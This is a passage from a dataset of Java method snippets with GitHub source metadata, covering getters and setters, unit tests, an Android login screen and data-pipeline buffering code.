undertale\");\n\t\tpacks.add(ConnectedBlockTextures.resourcePack = new CBTResourcePack(this));\n\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/mixin/ReloadableResourceManagerImplMixin.java", "stars": "3", "class_props": {"extends": null, "implements": ["ReloadableResourceManager"], "modifiers": ["public", "abstract"]}}, {"id": 31254, "method_name": "getPercentage", "class_name": "Rating", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getPercentage() {\n        return percentage;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/common/Rating.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31255, "method_name": "setPercentage", "class_name": "Rating", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPercentage(int percentage) {\n        this.percentage = percentage;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/common/Rating.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31256, "method_name": "getWatching", "class_name": "Rating", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getWatching() {\n        return watching;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/common/Rating.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31257, "method_name": "setWatching", "class_name": "Rating", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setWatching(int watching) {\n        this.watching = watching;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/common/Rating.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31258, "method_name": "getVotes", "class_name": "Rating", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVotes() {\n        return votes;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/common/Rating.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31259, "method_name": "setVotes", "class_name": "Rating", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVotes(int votes) {\n        this.votes = votes;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/common/Rating.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31260, "method_name": "getLoved", "class_name": "Rating", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLoved() {\n        return loved;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/common/Rating.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31261, "method_name": "setLoved", "class_name": "Rating", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLoved(int loved) {\n        this.loved = loved;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/common/Rating.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31262, "method_name": "getHated", "class_name": "Rating", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getHated() {\n        return hated;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/common/Rating.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31263, "method_name": "setHated", "class_name": "Rating", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHated(int hated) {\n        this.hated = hated;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/common/Rating.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31264, "method_name": "run", "class_name": "DataChecker", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void run() {\n\t\tif(p == null) {\n\t\t\tthrow new RuntimeException(\"Properties is null. Can't continue\");\n\t\t}\n\t\tif (!p.containsKey(SOURCE_TYPE)) {\n//\t\t    throw new RuntimeException(\"Must specify a \" + SOURCE_TYPE\n//\t\t          + \" key and value.\");\n\t\t\tlogger.info(\"Properties \"  + SOURCE_TYPE + \" value is Null !\");\n\t\t}\n\t\tif (!p.containsKey(DATA_OBJECT)) {\n//\t\t\tthrow new RuntimeException(\"Must specify a \" + DATA_OBJECT\n//\t\t\t          + \" key and value.\");\n\t\t\tlogger.info(\"Properties \" + DATA_OBJECT + \" value is Null !\");\n\t\t}\n\t\tWBDataCheckerDao wbDao = WBDataCheckerDao.getInstance();\n\t\t\n\t\tboolean success = wbDao.validateTableStatusFunction(p, logger);\n\t\tif(!success) {\n\t\t\tthrow new RuntimeException(\"Data not found.\");\n\t\t}\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/util/DataChecker.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31265, "method_name": "cancel", "class_name": "DataChecker", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void cancel() throws Exception {\n\t\tWBDataCheckerDao.closeDruidDataSource();\n\t\tthrow new RuntimeException(\"Kill this datachecker.\");\n\t}", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/util/DataChecker.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31266, "method_name": "getId", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31267, "method_name": "setId", "class_name": "OrderDO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(String id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31268, "method_name": "getUserId", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getUserId() {\n        return userId;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31269, "method_name": "setUserId", "class_name": "OrderDO", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUserId(Integer userId) {\n        this.userId = userId;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31270, "method_name": "getItemId", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getItemId() {\n        return itemId;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31271, "method_name": "setItemId", "class_name": "OrderDO", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setItemId(Integer itemId) {\n        this.itemId = itemId;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31272, "method_name": "getItemPrice", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "    public BigDecimal getItemPrice() {\n        return itemPrice;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31273, "method_name": "setItemPrice", "class_name": "OrderDO", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setItemPrice(BigDecimal itemPrice) {\n        this.itemPrice = itemPrice;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31274, "method_name": "getAmount", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getAmount() {\n        return amount;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31275, "method_name": "setAmount", "class_name": "OrderDO", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAmount(Integer amount) {\n        this.amount = amount;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31276, "method_name": "getOrderPrice", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "    public BigDecimal getOrderPrice() {\n        return orderPrice;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31277, "method_name": "setOrderPrice", "class_name": "OrderDO", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOrderPrice(BigDecimal orderPrice) {\n        this.orderPrice = orderPrice;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31278, "method_name": "getPromoId", "class_name": "OrderDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getPromoId() {\n        return promoId;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31279, "method_name": "setPromoId", "class_name": "OrderDO", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPromoId(Integer promoId) {\n        this.promoId = promoId;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31280, "method_name": "setUp", "class_name": "DistributionMasqueUIMapperTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void setUp() {\n        distributionMasqueUIMapper = new DistributionMasqueUIMapper(ClockFixture.clock(), hashGenerator);\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/data/DistributionMasqueUIMapperTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31281, "method_name": "toDistributionMasques_devrait_retourner_une_liste_de_DistributionMasque_a_partir_d_une_DistributionMasqueUI", "class_name": "DistributionMasqueUIMapperTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void toDistributionMasques_devrait_retourner_une_liste_de_DistributionMasque_a_partir_d_une_DistributionMasqueUI() {\n        // Given\n        IdentiteDemandeurUI identiteDemandeur = IdentiteDemandeurUIFixture.aIdentiteDemandeurUI();\n        String hashIdentite = identiteDemandeur.getHashIdentite();\n        DistributionMasqueUI distributionMasqueUI = DistributionMasqueUI.builder()\n                .identiteDemandeur(identiteDemandeur)\n                .nbMasquesAdulteUsageUnique(40)\n                .nbMasquesAdulteReutilisable(4)\n                .nbMasquesEnfantUsageUnique(12)\n                .nbMasquesEnfantReutilisable(2)\n                .build();\n        String hashDemandeur = \"f7e40706eceac692d8f82fabeb24b35a3d8b93e9e971d63afed99566152bce1c\";\n        when(hashGenerator.hasherAvecPepper(hashIdentite)).thenReturn(hashDemandeur);\n\n        // When\n        List<DistributionMasque> distributionMasques = distributionMasqueUIMapper.toDistributionMasques(distributionMasqueUI, CODE_POSTAL, TYPE_REMETTANT.name());\n\n        // Then\n        assertThat(distributionMasques.size()).isEqualTo(4);\n        DistributionMasque distributionMasqueAdulteUsageUnique = distributionMasques.get(0);\n        assertThat(distributionMasqueAdulteUsageUnique.getHashDemandeur()).isEqualTo(hashDemandeur);\n        assertThat(distributionMasqueAdulteUsageUnique.getDateDistribution()).isEqualTo(ClockFixture.now());\n        assertThat(distributionMasqueAdulteUsageUnique.getNbMasques()).isEqualTo(40);\n        assertThat(distributionMasqueAdulteUsageUnique.getTypeMasque()).isEqualTo(ADULTE_USAGE_UNIQUE);\n        assertThat(distributionMasqueAdulteUsageUnique.getNbPersonnes()).isEqualTo(identiteDemandeur.getNombreMineurs() + 1);\n        DistributionMasque distributionMasqueAdulteReutilisable = distributionMasques.get(1);\n        assertThat(distributionMasqueAdulteReutilisable.getHashDemandeur()).isEqualTo(hashDemandeur);\n        assertThat(distributionMasqueAdulteReutilisable.getDateDistribution()).isEqualTo(ClockFixture.now());\n        assertThat(distributionMasqueAdulteReutilisable.getNbMasques()).isEqualTo(4);\n        assertThat(distributionMasqueAdulteReutilisable.getTypeMasque()).isEqualTo(ADULTE_REUTILISABLE);\n        assertThat(distributionMasqueAdulteReutilisable.getNbPersonnes()).isEqualTo(identiteDemandeur.getNombreMineurs() + 1);\n        DistributionMasque distributionMasqueEnfantUsageUnique = distributionMasques.get(2);\n        assertThat(distributionMasqueEnfantUsageUnique.getHashDemandeur()).isEqualTo(hashDemandeur);\n        assertThat(distributionMasqueEnfantUsageUnique.getDateDistribution()).isEqualTo(ClockFixture.now());\n        assertThat(distributionMasqueEnfantUsageUnique.getNbMasques()).isEqualTo(12);\n        assertThat(distributionMasqueEnfantUsageUnique.getTypeMasque()).isEqualTo(ENFANT_USAGE_UNIQUE);\n        assertThat(distributionMasqueEnfantUsageUnique.getNbPersonnes()).isEqualTo(identiteDemandeur.getNombreMineurs() + 1);\n        DistributionMasque distributionMasqueEnfantReutilisable = distributionMasques.get(3);\n        assertThat(distributionMasqueEnfantReutilisable.getHashDemandeur()).isEqualTo(hashDemandeur);\n        assertThat(distributionMasqueEnfantReutilisable.getDateDistribution()).isEqualTo(ClockFixture.now());\n        assertThat(distributionMasqueEnfantReutilisable.getNbMasques()).isEqualTo(2);\n        assertThat(distributionMasqueEnfantReutilisable.getTypeMasque()).isEqualTo(ENFANT_REUTILISABLE);\n        assertThat(distributionMasqueEnfantReutilisable.getNbPersonnes()).isEqualTo(identiteDemandeur.getNombreMineurs() + 1);\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/data/DistributionMasqueUIMapperTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31282, "method_name": "toDistributionMasques_devrait_filtrer_les_distributions_dont_le_nombre_de_masques_est_egal_a_zero", "class_name": "DistributionMasqueUIMapperTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void toDistributionMasques_devrait_filtrer_les_distributions_dont_le_nombre_de_masques_est_egal_a_zero() {\n        // Given\n        IdentiteDemandeurUI identiteDemandeur = IdentiteDemandeurUIFixture.aIdentiteDemandeurUI();\n        String hashIdentite = identiteDemandeur.getHashIdentite();\n        DistributionMasqueUI distributionMasqueUI = DistributionMasqueUI.builder()\n                .identiteDemandeur(identiteDemandeur)\n                .nbMasquesAdulteUsageUnique(0)\n                .nbMasquesAdulteReutilisable(0)\n                .build();\n        String hashDemandeur = \"f7e40706eceac692d8f82fabeb24b35a3d8b93e9e971d63afed99566152bce1c\";\n        when(hashGenerator.hasherAvecPepper(hashIdentite)).thenReturn(hashDemandeur);\n\n        // When\n        List<DistributionMasque> distributionMasques = distributionMasqueUIMapper.toDistributionMasques(distributionMasqueUI, CODE_POSTAL, TYPE_REMETTANT.name());\n\n        // Then\n        assertThat(distributionMasques).isEmpty();\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/data/DistributionMasqueUIMapperTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31283, "method_name": "toDistributionMasques_devrait_filtrer_les_distributions_dont_le_nombre_de_masques_est_null", "class_name": "DistributionMasqueUIMapperTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void toDistributionMasques_devrait_filtrer_les_distributions_dont_le_nombre_de_masques_est_null() {\n        // Given\n        IdentiteDemandeurUI identiteDemandeur = IdentiteDemandeurUIFixture.aIdentiteDemandeurUI();\n        String hashIdentite = identiteDemandeur.getHashIdentite();\n        DistributionMasqueUI distributionMasqueUI = DistributionMasqueUI.builder()\n                .identiteDemandeur(identiteDemandeur)\n                .nbMasquesAdulteUsageUnique(null)\n                .nbMasquesAdulteReutilisable(null)\n                .build();\n        String hashDemandeur = \"f7e40706eceac692d8f82fabeb24b35a3d8b93e9e971d63afed99566152bce1c\";\n        when(hashGenerator.hasherAvecPepper(hashIdentite)).thenReturn(hashDemandeur);\n\n        // When\n        List<DistributionMasque> distributionMasques = distributionMasqueUIMapper.toDistributionMasques(distributionMasqueUI, CODE_POSTAL, TYPE_REMETTANT.name());\n\n        // Then\n        assertThat(distributionMasques).isEmpty();\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/data/DistributionMasqueUIMapperTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31284, "method_name": "toDistributionMasques_devrait_mettre_le_mode_de_saisie_et_le_type_remettant_a_null_quand_ils_sont_vides", "class_name": "DistributionMasqueUIMapperTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void toDistributionMasques_devrait_mettre_le_mode_de_saisie_et_le_type_remettant_a_null_quand_ils_sont_vides() {\n        // Given\n        IdentiteDemandeurUI identiteDemandeur = IdentiteDemandeurUIFixture.aIdentiteDemandeurUI();\n        identiteDemandeur.setModeSaisie(\"\");\n        String hashIdentite = identiteDemandeur.getHashIdentite();\n        DistributionMasqueUI distributionMasqueUI = DistributionMasqueUI.builder()\n                .identiteDemandeur(identiteDemandeur)\n                .nbMasquesAdulteUsageUnique(40)\n                .nbMasquesAdulteReutilisable(4)\n                .build();\n        String hashDemandeur = \"f7e40706eceac692d8f82fabeb24b35a3d8b93e9e971d63afed99566152bce1c\";\n        when(hashGenerator.hasherAvecPepper(hashIdentite)).thenReturn(hashDemandeur);\n\n        // When\n        List<DistributionMasque> distributionMasques = distributionMasqueUIMapper.toDistributionMasques(distributionMasqueUI, CODE_POSTAL, null);\n\n        // Then\n        assertThat(distributionMasques.get(0).getModeSaisie()).isNull();\n        assertThat(distributionMasques.get(0).getTypeRemettant()).isNull();\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/data/DistributionMasqueUIMapperTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31285, "method_name": "setUp", "class_name": "OgnlStaticTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {\n    // create a SqlSessionFactory\n    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/ognlstatic/mybatis-config.xml\")) {\n      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n    }\n\n    // populate in-memory database\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n            \"org/apache/ibatis/submitted/ognlstatic/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/ognlstatic/OgnlStaticTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31286, "method_name": "shouldGetAUserStatic", "class_name": "OgnlStaticTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAUserStatic() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      User user = mapper.getUserStatic(1);\n      Assertions.assertNotNull(user);\n      Assertions.assertEquals(\"User1\", user.getName());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/ognlstatic/OgnlStaticTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31287, "method_name": "shouldGetAUserWithIfNode", "class_name": "OgnlStaticTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAUserWithIfNode() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      User user = mapper.getUserIfNode(\"User1\");\n      Assertions.assertEquals(\"User1\", user.getName());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/ognlstatic/OgnlStaticTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31288, "method_name": "onCreate", "class_name": "LoginPage", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.login_page);\n        //\u767b\u5f55\u6309\u94ae\u4e8b\u4ef6\u7ed1\u5b9a\n        Button btn_for_login;\n        btn_for_login = findViewById(R.id.login_loginbtn);\n        btn_for_login.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                finish();\n            }\n        });\n        //\u6ce8\u518c\u6309\u94ae\u4e8b\u4ef6\u7ed1\u5b9a\n        Button btn_for_register;\n        btn_for_register = findViewById(R.id.login_registerbtn);\n        btn_for_register.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                Intent it_for_register = new Intent(LoginPage.this, RegisterPage.class);\n                startActivity(it_for_register);\n                finish();\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/RotonNorrison/StirDiary/master/app/src/main/java/com/example/stirdiary/LoginPage.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 31289, "method_name": "cast", "class_name": "NumberTypeConversion", "params": ["Class<?>", "Type", "Object"], "throws": null, "modifiers": ["protected"], "return_type": "Object", "snippet": "    protected Object cast(Class<?> target, Type[] neededGenerics, Object rawVal) {\n\n        Number value = (Number) rawVal;\n        // Wrapper classes are evil!\n        if (target.equals(Number.class)) {\n            return value;\n        } else if (target.equals(int.class) || target.equals(Integer.class)) {\n            if (value instanceof Integer) {\n                return value;\n            } else {\n                return value.intValue();\n            }\n        } else if (target.equals(byte.class) || target.equals(Byte.class)) {\n            if (value instanceof Byte) {\n                return value;\n            } else {\n                return value.byteValue();\n            }\n        } else if (target.equals(long.class) || target.equals(Long.class)) {\n            if (value instanceof Long) {\n                return value;\n            } else {\n                return value.longValue();\n            }\n        } else if (target.equals(double.class) || target.equals(Double.class)) {\n            if (value instanceof Double) {\n                return value;\n            } else {\n                return value.doubleValue();\n            }\n        } else if (target.equals(float.class) || target.equals(Float.class)) {\n            if (value instanceof Float) {\n                return value;\n            } else {\n                return value.floatValue();\n            }\n        } else if (target.equals(short.class) || target.equals(Short.class)) {\n            if (value instanceof Short) {\n                return value;\n            } else {\n                return value.shortValue();\n            }\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/typeconversions/NumberTypeConversion.java", "stars": "3", "class_props": {"extends": "TypeConversion", "implements": null, "modifiers": ["public"]}}, {"id": 31290, "method_name": "isApplicable", "class_name": "NumberTypeConversion", "params": ["Class<?>", "Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isApplicable(Class<?> target, Object value) {\n\n        return (target.isPrimitive() || Number.class.isAssignableFrom(target))\n                && !boolean.class.isAssignableFrom(target);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/typeconversions/NumberTypeConversion.java", "stars": "3", "class_props": {"extends": "TypeConversion", "implements": null, "modifiers": ["public"]}}, {"id": 31291, "method_name": "getParametersRequired", "class_name": "NumberTypeConversion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getParametersRequired() {\n\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/typeconversions/NumberTypeConversion.java", "stars": "3", "class_props": {"extends": "TypeConversion", "implements": null, "modifiers": ["public"]}}, {"id": 31292, "method_name": "getInstance", "class_name": "RegisterA", "params": [], "throws": null, "modifiers": ["public", "static", "synchronized"], "return_type": "RegisterA", "snippet": "    public static synchronized RegisterA getInstance() {\n        if (instance == null) {\n            instance = new RegisterA();\n        }\n        return instance;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/RegisterA.java", "stars": "4", "class_props": {"extends": "Register", "implements": null, "modifiers": ["public"]}}, {"id": 31293, "method_name": "createRecord", "class_name": "BufferedRecordExchanger", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Record", "snippet": "    public Record createRecord() {\n        try {\n            return BufferedRecordExchanger.RECORD_CLASS.newInstance();\n        } catch (Exception e) {\n            throw DataXException.asDataXException(\n                    FrameworkErrorCode.CONFIG_ERROR, e);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 31294, "method_name": "sendToWriter", "class_name": "BufferedRecordExchanger", "params": ["Record"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendToWriter(Record record) {\n        if (shutdown) {\n            throw DataXException.asDataXException(CommonErrorCode.SHUT_DOWN_TASK, \"\");\n        }\n\n        Validate.notNull(record, \"record\u4e0d\u80fd\u4e3a\u7a7a.\");\n\n        if (record.getMemorySize() > this.byteCapacity) {\n            this.pluginCollector.collectDirtyRecord(record, new Exception(String.format(\"\u5355\u6761\u8bb0\u5f55\u8d85\u8fc7\u5927\u5c0f\u9650\u5236\uff0c\u5f53\u524d\u9650\u5236\u4e3a:%s\", this.byteCapacity)));\n            return;\n        }\n\n        boolean isFull = (this.bufferIndex >= this.bufferSize || this.memoryBytes.get() + record.getMemorySize() > this.byteCapacity);\n        if (isFull) {\n            flush();\n        }\n\n        this.buffer.add(record);\n        this.bufferIndex++;\n        memoryBytes.addAndGet(record.getMemorySize());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 31295, "method_name": "flush", "class_name": "BufferedRecordExchanger", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void flush() {\n        if (shutdown) {\n            throw DataXException.asDataXException(CommonErrorCode.SHUT_DOWN_TASK, \"\");\n        }\n        this.recordChannel.pushAll(this.buffer);\n        this.buffer.clear();\n        this.bufferIndex = 0;\n        this.memoryBytes.set(0);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 31296, "method_name": "terminate", "class_name": "BufferedRecordExchanger", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void terminate() {\n        if (shutdown) {\n            throw DataXException.asDataXException(CommonErrorCode.SHUT_DOWN_TASK, \"\");\n        }\n        flush();\n        this.recordChannel.pushTerminate(TerminateRecord.get());\n    }", "url": 